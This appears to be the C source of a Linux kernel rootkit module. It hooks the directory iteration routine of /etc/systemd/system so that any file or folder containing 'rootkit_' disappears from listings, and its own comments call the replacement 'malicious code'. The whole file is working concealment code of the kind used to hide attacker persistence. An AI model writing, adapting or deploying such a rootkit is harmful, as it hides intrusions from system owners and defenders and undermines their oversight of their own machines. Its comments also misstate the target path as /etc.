#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <net/net_namespace.h>


// We will hide all the folders and files with this prefix
// that are inside /etc folder
static const char *hide_string = "rootkit_";

// System path in which files and folders will need to be
// if we want to hide them (/etc)
static const char *path_name_etc = "/etc/systemd/system";

// Structs that we will use to store a copy before
// manipulating
static struct file_operations folder_fops;
static struct file_operations *folder_backup_fops;
static struct inode *folder_inode;
struct dir_context *folder_backup_ctx;
static struct path folder_path;


// This functions does the same as the "filldir" from the kernel
// The only difference is that it will return a 0 if the folder
// or file contains the specified string
static int new_folder_filldir(struct dir_context *ctx, 
                       	      const char *file_name,
			      int len,
                              loff_t off, u64 ino, unsigned int d_type)
{
        // Hide if contains the specified string (return 0)
        if (strstr(file_name, hide_string) != NULL)
                return 0;

        // Return what the original functions returns
        return folder_backup_ctx->actor(folder_backup_ctx, file_name, 
			                len, off, ino, d_type);
}

// This is the context, here we changed the legitimate
// for our malicious code
struct dir_context folder_ctx = {
        .actor = new_folder_filldir,
};


// This function does the same as the "iterate_shared" from the kernel
// but will call a context manipulated for us. 
int folder_iterate_shared(struct file *file, struct dir_context *ctx)
{
        int result = 0;
        folder_ctx.pos = ctx->pos;
        folder_backup_ctx = ctx;
        result = folder_backup_fops->iterate_shared(file, &folder_ctx);
        ctx->pos = folder_ctx.pos;

        return result;
}

// Copy the kernel code and swap it with
// our malicious code
static int __init hide_folder(void)
{
        if(kern_path(path_name_etc, 0, &folder_path))
                return 0;

        // copy the structures
        folder_inode = folder_path.dentry->d_inode;
        folder_fops = *folder_inode->i_fop;
        folder_backup_fops = folder_inode->i_fop;
        // modify the copy with our evil function
        folder_fops.iterate_shared = folder_iterate_shared;
        folder_inode->i_fop = &folder_fops;

        return 1;
}

// This functions is not needed
// Just useful for removing the lkm without problems
void unhide_folder(void)
{
        if(kern_path(path_name_etc, 0, &folder_path))
                return;

        //Restore the original code
        folder_inode = folder_path.dentry->d_inode;
        folder_inode->i_fop = folder_backup_fops;
}
